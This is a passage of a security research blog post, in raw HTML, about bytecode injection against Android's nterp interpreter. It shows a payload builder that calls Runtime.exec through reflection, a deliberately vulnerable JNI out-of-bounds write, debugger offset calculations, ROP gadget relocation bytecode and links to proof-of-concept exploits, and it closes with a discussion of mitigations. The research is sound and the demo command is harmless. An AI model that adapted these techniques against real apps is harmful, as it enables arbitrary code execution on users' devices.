</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>new_instance</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s1>&#39;StringBuilder&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 002e: 70 10 0b 00 03 00 INVOKE_DIRECT {v3}, METHOD:Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_direct</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>stringbuilder_constructor_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0034: 6e 20 0c 00 23 00 INVOKE_VIRTUAL {v3, v2}, METHOD:Ljava/lang/StringBuilder;-&gt;append([C)Ljava/lang/StringBuilder;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>stringbuilder_append_chararray_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v3</span><span class=p>,</span> <span class=n>v2</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 003a: 71 00 09 00 00 00 INVOKE_STATIC {}, METHOD:Ljava/lang/Runtime;-&gt;getRuntime()Ljava/lang/Runtime;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_static</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>getruntime_index</span><span class=p>,</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=c1># 0040: 0c 04             MOVE_RESULT_OBJECT v4</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>move_result_object</span><span class=p>(</span><span class=n>v4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0042: 6e 10 08 00 04 00 INVOKE_VIRTUAL {v4}, METHOD:Ljava/lang/Object;-&gt;getClass()Ljava/lang/Class;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>object_getclass_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v4</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0048: 0c 05             MOVE_RESULT_OBJECT v5</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>move_result_object</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 004a: 6e 10 0d 00 03 00 INVOKE_VIRTUAL {v3}, METHOD:Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>stringbuilder_tostring_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0050: 0c 06             MOVE_RESULT_OBJECT v6</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>move_result_object</span><span class=p>(</span><span class=n>v6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0052: 12 17             CONST_4 v7, #+1</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>const_16</span><span class=p>(</span><span class=n>v7</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0054: 23 77 14 00       NEW_ARRAY v7, v7, TYPE:[Ljava/lang/Class;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>new_array</span><span class=p>(</span><span class=n>v7</span><span class=p>,</span> <span class=n>v7</span><span class=p>,</span> <span class=s1>&#39;Class[]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0058: 12 08             CONST_4 v8, #+0</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>const_16</span><span class=p>(</span><span class=n>v8</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 005a: 1c 09 0c 00       CONST_CLASS v9, TYPE:Ljava/lang/String;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>const_class</span><span class=p>(</span><span class=n>v9</span><span class=p>,</span> <span class=s1>&#39;String&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 005e: 4d 09 07 08       APUT_OBJECT v9, v7, v8</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>aput_object</span><span class=p>(</span><span class=n>v9</span><span class=p>,</span> <span class=n>v7</span><span class=p>,</span> <span class=n>v8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0062: 6e 30 07 00 65 07 INVOKE_VIRTUAL {v5, v6, v7}, METHOD:Ljava/lang/Class;-&gt;getDeclaredMethod(Ljava/lang/String;,[Ljava/lang/Class;)Ljava/lang/reflect/Method;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>class_getdeclaredmethod_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v5</span><span class=p>,</span> <span class=n>v6</span><span class=p>,</span> <span class=n>v7</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0068: 0c 05             MOVE_RESULT_OBJECT v5</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>move_result_object</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 006a: 6e 10 0d 00 01 00 INVOKE_VIRTUAL {v1}, METHOD:Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>stringbuilder_tostring_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0070: 0c 06             MOVE_RESULT_OBJECT v6</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>move_result_object</span><span class=p>(</span><span class=n>v6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0072: 24 10 15 00 06 00 FILLED_NEW_ARRAY {v6}, TYPE:[Ljava/lang/Object;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>filled_new_array</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;Object[]&#39;</span><span class=p>,</span> <span class=p>[</span><span class=n>v6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0078: 0c 06             MOVE_RESULT_OBJECT v6</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>move_result_object</span><span class=p>(</span><span class=n>v6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 007a: 6e 30 0f 00 45 06 INVOKE_VIRTUAL {v5, v4, v6}, METHOD:Ljava/lang/reflect/Method;-&gt;invoke(Ljava/lang/Object;,[Ljava/lang/Object;)Ljava/lang/Object;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>method_invoke_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v5</span><span class=p>,</span> <span class=n>v4</span><span class=p>,</span> <span class=n>v6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0080: 0e 00             RETURN_VOID </span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>return_void</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># 0082: 00 00             NOP </span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>nop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># 0084: ARRAY_PAYLOAD Array@{108, 111, 103, 32, 34, 104, 101, 108, 108, 111, 32, 116, 104, 101, 114, 101, 33, 34}</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>array_payload</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>command</span><span class=p>),</span> <span class=n>command_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 00b0: ARRAY_PAYLOAD Array@{101, 120, 101, 99}</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>array_payload</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;e</span><span class=se>\x00</span><span class=s1>x</span><span class=se>\x00</span><span class=s1>e</span><span class=se>\x00</span><span class=s1>c</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>build</span><span class=p>()</span>
</span></span></code></pre></div><p>The java equivalent could look something like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=n>cCommand</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=o>&lt;</span><span class=n>command</span><span class=o>&gt;</span><span class=w> </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>StringBuilder</span><span class=w> </span><span class=n>bCommand</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>bCommand</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cCommand</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=n>cExec</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=sc>&#39;e&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;x&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;e&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;c&#39;</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>StringBuilder</span><span class=w> </span><span class=n>bExec</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>bExec</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cExec</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>Runtime</span><span class=w> </span><span class=n>runtime</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>runtimeClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>runtime</span><span class=p>.</span><span class=na>getClass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>execName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>bExec</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>signature</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>Method</span><span class=w> </span><span class=n>exec</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>runtimeClass</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=n>execName</span><span class=p>,</span><span class=w> </span><span class=n>signature</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>bCommand</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>exec</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>runtime</span><span class=p>,</span><span class=w> </span><span class=n>args</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><h3 id=the-attack>The Attack</h3><p>With a payload at hand, it is time to abuse the memory error and obtain arbitrary command execution in the context of the target app.</p><p>Before injecting the bytecode, the leaked stack address must be understood properly in order to find the exact location of the payload. To that end, a particular execution yields a leak of <code>0x6eb6aec650</code>. Remember the original C code of <code>writeIndexed</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>extern</span> <span class=s>&#34;C&#34;</span>
</span></span><span class=line><span class=cl><span class=n>JNIEXPORT</span> <span class=kt>void</span> <span class=n>JNICALL</span>
</span></span><span class=line><span class=cl><span class=nf>Java_com_poc_poc_1remote_MainActivity_writeIndexed</span><span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span> <span class=n>jclass</span> <span class=n>clazz</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                   <span class=n>jint</span> <span class=n>index</span><span class=p>,</span> <span class=n>jlong</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                   <span class=nf>__attribute__</span> <span class=p>((</span><span class=n>optnone</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>buffer</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>buffer</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>With that in mind, lets consider the following simplified disassembly of the vulnerable <code>writeIndexed</code> method:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>sub</span>     <span class=no>sp</span><span class=p>,</span> <span class=no>sp</span><span class=p>,</span> <span class=c1>#0x50
</span></span></span><span class=line><span class=cl><span class=nf>stp</span>     <span class=no>x29</span><span class=p>,</span> <span class=no>x30</span><span class=p>,</span> <span class=p>[</span><span class=no>sp</span><span class=p>,</span> <span class=c1>#64]
</span></span></span><span class=line><span class=cl><span class=nf>add</span>     <span class=no>x29</span><span class=p>,</span> <span class=no>sp</span><span class=p>,</span> <span class=c1>#0x40  ; frame pointer = sp + 0x40
</span></span></span><span class=line><span class=cl><span class=nf>sub</span>     <span class=no>x8</span><span class=p>,</span> <span class=no>x29</span><span class=p>,</span> <span class=c1>#0x10  ; buffer = frame pointer - 0x10 = sp + 0x30
</span></span></span><span class=line><span class=cl><span class=nf>str</span>     <span class=no>x8</span><span class=p>,</span> <span class=p>[</span><span class=no>sp</span><span class=p>,</span> <span class=c1>#8]
</span></span></span><span class=line><span class=cl><span class=na>...</span>
</span></span><span class=line><span class=cl><span class=nf>ldr</span>     <span class=no>x9</span><span class=p>,</span> <span class=p>[</span><span class=no>sp</span><span class=p>,</span> <span class=c1>#8]    ; base address
</span></span></span><span class=line><span class=cl><span class=nf>ldrsw</span>   <span class=no>x10</span><span class=p>,</span> <span class=p>[</span><span class=no>sp</span><span class=p>,</span> <span class=c1>#28]  ; index
</span></span></span><span class=line><span class=cl><span class=nf>mov</span>     <span class=no>x11</span><span class=p>,</span> <span class=c1>#0x8       ; element size
</span></span></span><span class=line><span class=cl><span class=nf>madd</span>    <span class=no>x9</span><span class=p>,</span> <span class=no>x10</span><span class=p>,</span> <span class=no>x11</span><span class=p>,</span> <span class=no>x9</span>    <span class=c1>; where = index * size + base
</span></span></span><span class=line><span class=cl><span class=nf>str</span>     <span class=no>x8</span><span class=p>,</span> <span class=p>[</span><span class=no>x9</span><span class=p>]</span>    <span class=c1>; indexed write
</span></span></span></code></pre></div><p>In a nutshell, the buffer is located <code>0x10</code> below the old base pointer and return address. This can be confirmed using a debugger:</p><pre tabindex=0><code>gef➤  x/1gx $sp+0x8
    0x6eb6aec628:   0x0000006eb6aec650
gef➤  p/x $x29-0x10
    $1 = 0x6eb6aec650
</code></pre><p>Coincidentally, the pointer leaked via <code>leakStack</code> is exactly the base address of the buffer, relative to which the index oob write happens.</p><p>Now, two things must be identified:</p><ol><li>At what index resides the <code>dex_pc</code>?</li><li>Where is a save location to store the payload to?</li></ol><p>The first point is addressed to some degree in a <a href=#bytecode-injection>previous section</a>
that showed a reverse - engineered view of the stack taking into account <code>nterp</code> and JNI stack frames. Therefore, without showing the details of the stack again, the byte offset to write to can be computed by subtracting the buffer base address from the address of the spilled <code>x22</code> register. Then, because buffer elements are <code>64</code> - bit integers, divide by the element size to obtain the final <code>index</code> (we have an <em>indexed</em> oob write).</p><pre tabindex=0><code>gef➤  p/x (0x00006eb6aec6d8 - 0x00006eb6aec650) / 8
$2 = 0x11
</code></pre><p>Next, the payload must be stored to a <em>stable</em> region on the stack. Most importantly, no data structures required to continue the execution of the (hijacked) bytecode method that called the <code>writeIndexed</code> method need to be corrupted. So, with some testing, it turns out that the payload may be moved <code>0x1000</code> bytes behind the buffer base address, i.e. starting at index <code>0x1000 / 8 = 0x200</code>.</p><p>For a <a href=https://github.com/fkie-cad/Android-Bytecode-Exploitation/blob/main/bytecode-injection/poc_remote_bytecode_injection.py target=_blank rel=noopener>PoC</a>
, consider the following video.<video src=/2024/09/bytecode_exploitation_2_poc_remote_video.webm width=100% controls></video></p><h3 id=context---switching>Context - Switching</h3><p>In this section, I want to discuss a few approaches on how to handle insufficient contexts during bytecode injection. A major problem is if the context available does not provide enough types or methods to do anything useful. For example, if we were missing the <code>StringBuilder</code> type in the above case study, then the payload would not work. Of course, as is discussed <a href=#further-applications>later</a>
, we could try to use bytecode as an intermediate stage in case the context is insufficient.</p><p>Alternatively, if an attacker wants to only execute bytecode, because e.g. native - level security mechanisms are preventing any kind of ROP, then the attacker will only be left with <em>switching the context</em>. As of writing, <em>two</em> ways to perform <em>context - switching</em> come to mind. All approaches work by corrupting a <em>different</em> <code>dex_pc</code> than the one that provides an insufficient context. In general, as long as an attacker can ensure that a <code>dex_pc</code> is executed eventually, that <code>dex_pc</code> may be used to switch the execution context. The following visualization shows the high - level idea of context - switching. Notice that the context is determined by an attacker&rsquo;s goals.<div class=not-prose><figure><img src=/2024/09/bytecode_exploitation_2_context_switching_abstract.png alt="context - switching idea" loading=lazy></figure></div></p><p>The first approach is to try to corrupt an <code>ArtMethod</code> that is stored in a predictable location. For this to work, the method must be called after the attacker corrupted the <code>dex_pc</code>. Finding an <code>ArtMethod</code> instance is tricky and may require additional information leaks for a remote attacker. In a local setting, there exists a plethora of <code>ArtMethod</code>s to be used by an attacker, e.g. in <code>boot.art</code>.</p><p>Secondly, if an attacker is only given the ability to corrupt stack values, then the bytecode method call chain can be traversed to find a fitting context. Because the Android runtime is complex, often plenty of method invocations are performed until the vulnerable native method is called eventually. This leaves room to corrupt other <code>dex_pc</code>s belonging to parent methods. However, if an attacker is unable to <em>go up</em> the call chain, then it may be possible to <em>go down</em> the call chain. To that end, an attacker needs to be able to invoke a method that takes in a callback. If an attacker is able to pass a callback consisting of custom bytecode into a method, then this will result in a new call chain until the callback is invoked. These ideas are visualized in the following diagram.<div class=not-prose><figure><img src=/2024/09/bytecode_exploitation_2_bytecode_context_switching.png alt="Bytecode Context Switching" loading=lazy></figure></div></p><p>Basically, the above figure shows stack frames matching a call chain. On the left, an attacker corrupts any spilled <code>dex_pc</code> on the stack, potentially switching the context depending on what method is hijacked. On the right, an attacker somehow manages to pass custom bytecode into a method that eventually invokes that bytecode. From there on, an attacker can either use bytecode to corrupt a legitimate, calling method that stems from the callback call chain, or <em>stay</em> in the context of the callback. Notice, however, that specifying a callback most certainly requires knowledge on the class of the callback object. Therefore, specifying a callback requires knowing the context of the callback, which somewhat defeats the purpose of doing this in the first place.</p><p>Regardless of what approach is used, the absolute best context to end up in is in a <code>.dex</code> file of <code>framework.jar</code>. These <code>.dex</code> files contain a large fraction of the app - related Android runtime and thus provide a lot of types and methods. Moreover, because <code>framework.jar</code> is copied to all apps forked from <code>zygote64</code>, pure bytecode payloads for <code>.dex</code> files of <code>framework.jar</code> are universal for the target device under the assumption that <code>framework.jar</code> does not change.</p><h3 id=further-applications>Further Applications</h3><p>The case study shows that bytecode injection can be used to fully take over a thread in the target app via a memory error. For the PoC, bytecode is used to invoke a system command.</p><p>However, it is also possible to use bytecode as an intermediate stage, e.g. to set up a ROP chain. To that end, remember that vregs are not bounds - checked. Therefore, any attacker - chosen bytecode can access, i.e. read and write, any value on the stack following the vregs and vrefs arrays of the hijacked method. Ignoring the fact that writing to e.g. <code>v0</code> almost always writes to <code>r0</code> as well, it is possible for bytecode to set up ROP gadgets on the stack by filling the <em>right</em> vregs and vrefs that overlap with a return address. Notice that one can use bytecode instructions like <code>move-object</code> to always write a value to both, vregs and vrefs. Then, an attacker can pretend to only write to vrefs to set up the ROP chain on the stack, fully ignoring the fact that writing to vrefs at some point overwrites the values stored in vregs.</p><p>In the example above, using ROP directly is most likely impossible, because an attacker is lacking knowledge on the location of an executable memory region to return into. However, because bytecode can read beyond the vregs array, an attacker can <em>pick up</em> a code pointer stored on the stack, e.g. a return address, and use it to compute the base address of the associated module. Of course, an attacker must be able to either identify the module to compute the base address, or handle segfaults to probe for the beginning of the memory region. Given the base address, an attacker can then relocate their own gadgets stored inside the bytecode, e.g. as constants encoded inside instructions, to obtain a fully functional ROP chain. Then, what is left is to link the ROP chain into a return address, which kicks off gadget chain execution.</p><p>For example, the following bytecode can be used to grab the base address of <code>libart.so</code>. Notice that <code>return_address_vreg_index</code> and <code>return_address_offset</code> are to be chosen by an attacker and mean the index of the return address in terms of vregs and the offset of the return address relative to <code>libart.so</code>, respectively.</p><pre tabindex=0><code>move-wide/16    v0, &lt;return_address_vreg_index&gt;
const-wide      v2, &lt;return_address_offset&gt;
sub-long        v0, v0, v2
</code></pre><p>Once a fitting ROP chain is found, <em>parts</em> of the chain must be marked for dynamic relocation. An example of a ROP chain component that does not need relocation is a <em>command string</em>. Of course, if working with the address of the command string, relocation will be necessary again. Consider the generic bytecode for relocating ROP gadgets:</p><pre tabindex=0><code>const-wide      v2, gadget
add-long        v2, v2, v&lt;libart_base_vreg_index&gt;
move-object16   v&lt;2 * index + return_address_vreg_index&gt;, v2
move-object16   v&lt;2 * index + return_address_vreg_index + 1&gt;, v3
</code></pre><p>In a nutshell, <code>gadget</code> is the offset of the current gadget relative to <code>libart.so</code>. The offset is stored to <code>v2</code> and <code>v3</code> (64 - bit in total) and added to the vreg that holds the base address of <code>libart.so</code>. Results are stored into <code>v2</code>. Afterwards, <code>move-object16</code> is utilized to lower and upper 32 - bit values of the relocated address into vregs and vrefs that represent the current ROP chain gadget on the stack. The above code snippet is executed for each ROP gadget, which means the ROP chain is built up one by one at runtime. This is only possible, because vreg and vref indices are <em>not bounds - checked</em> at runtime. Furthermore, observe that gadget offsets are <em>stored inside bytecode</em> and <em>relocated using spilled libart leak</em>.</p><p>Without discussing all the details of the PoC exploit, the following visualization aims to highlight the general idea of using bytecode to relocate a ROP chain.<div class=not-prose><figure><img src=/2024/09/bytecode_exploitation_2_jitrop.gif alt="Visualization of bytecode - based ROP attack" loading=lazy></figure></div></p><p>And finally, to finish off the idea of bytecode - induced ROP attacks, a <a href=https://github.com/fkie-cad/Android-Bytecode-Exploitation/blob/main/bytecode-injection/poc_remote_jitrop.py target=_blank rel=noopener>PoC</a>
video is provided!<video src=/2024/09/bytecode_exploitation_2_poc_remote_jitrop_video.webm width=100% controls></video></p><p>Another interesting approach may be to look into similar bytecode - related exploitation areas, like <a href=https://v8.dev/ target=_blank rel=noopener><em>V8</em></a>
. Usually, when exploiting a bug in V8, an attacker builds up primtives like <code>fakeobj</code> and <code>addrof</code>, which are often escalated into <code>read</code> and <code>write</code> primitives. Without having looked into this thoroughly, it may be possible to use the same ideas when injecting bytecode to construct and access objects that allow reading from and writing to arbitrary memory regions. However, a limiting factor seems to be that object references are always 32 - bit addresses. <em>Luckily</em>, there exist classes like <a href=https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r78/core/java/android/os/Parcel.java#230 target=_blank rel=noopener><code>Parcel</code></a>
and its associated <a href=https://android.googlesource.com/platform/frameworks/native/+/refs/tags/android-13.0.0_r78/libs/binder/include/binder/Parcel.h#61 target=_blank rel=noopener>C++ implementation</a>
that store 64-bit pointers inside objects. Taking into account that <code>Parcel</code> provides methods like <a href=https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r78/core/java/android/os/Parcel.java#1047 target=_blank rel=noopener><code>writeLong</code></a>
that writes a 64-bit value to a location relative to an internal pointer, <code>Parcel</code> seems like the perfect candidate to build up WWW and RWW primitives from bytecode. Furthermore, <code>Parcel</code> is a very common class and thus available in a plethora of contexts. Unfortunately, due to time constraints, I have not been able to construct a PoC for this idea.</p><h3 id=possible-mitigations>Possible Mitigations</h3><p>Following native - level mitigations against code injection, the first idea that comes to mind is to <em>somehow</em> force <code>nterp</code> to distinguish between code and data. For example, it may be possible to restrict <code>dex_ptr</code> to <code>.dex</code> files only. However, even inside a <code>.dex</code> file, data and code are mixed. For example, the <code>code_item</code> of a method in a <code>.dex</code> file consists of metadata describing and the concrete bytecode representing the method. Therefore, restricting bytecode execution to <code>.dex</code> files does not suffice, unless it can be guaranteed that redirecting bytecode execution to data structures in a <code>.dex</code> file does not suffice for a successful exploit, which is impossible. Because data and bytecode are closely coupled in memory, <code>nterp</code> cannot use page permissions either: the page permissions are to <em>coarse</em>.</p><p>Another approach could be to redesign the layout of <code>.dex</code> files, so that bytecode is stored in executable readonly regions, whereas associated data structures are stored in adjacent readonly memory. Whether this is practical or not is to be determined. Such a major redesign would also need rigorous permission checks, because <code>nterp</code> does not have hardware support that prevents execution of non - executable memory.</p><h2 id=summary>Summary</h2><p>In this blog post, the first bytecode - based exploitation technique, namely <em>bytecode injection</em>, is discussed and demonstrated using a simplistic, deliberately vulnerable Android app. Various caveats regarding bytecode injection, like <code>String</code> construction, method invocation and even <em>insufficient contexts</em>, are explained and solved. Furthermore, it is highlighted how bytecode may function as a stepping stone for other attacks like ROP.</p><p>A neat side - effect is that bytecode is architecture - agnostic. Only changes to the bytecode interpreter can prevent that bytecode shellcode executes successfully. Because it is possible to create Android apps for various older Android versions, shellcode can most certainly be constructed as backward - compatible as an app can be.</p></article></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2022 - 2026 lolcads</div><div class="flex flex-row"><span class="ml-0 pl-0 md:ml-2 md:pl-2 border-l-0 md:border-l border-slate-300 dark:border-slate-400">Powered by <a href=https://gohugo.io target=_blank rel=noopener class=underline>Hugo</a> <span class=text-red-600>&#9829;</span> <a href=https://github.com/tomowang/hugo-theme-tailwind target=_blank rel=noopener class=underline>Tailwind</a></span></div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script 